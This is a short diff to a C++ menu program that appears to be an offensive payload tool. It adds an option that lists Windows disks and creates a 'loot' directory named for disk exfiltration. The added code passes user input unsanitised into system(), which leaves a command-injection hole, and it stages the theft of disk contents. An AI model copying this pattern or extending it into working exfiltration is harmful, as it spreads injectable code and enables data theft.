@@ -111,6 +111,21 @@ int main(){
             cout << "[" << green << "*" << reset << "] Payload runned successfully" << endl;
         }
 
+        else if (choice == "6"){
+            // List disk 
+            system("wmic logicaldisk get name");
+
+            // Ask for select a disk 
+            string disk_letter;
+
+            cout << "[" << magenta << "+" << reset << "] Enter your disk ( " << red << "only letter" << reset << ") > ";
+            cin >> disk_letter;
+
+            // Make loot exfiltration directory
+            string payload = "mkdir loot/" + disk_letter + "_disk_exfilatrion";
+            system(payload.c_str());
+        }
+
         else if (choice == "0"){
             // Stop running
             running = false;
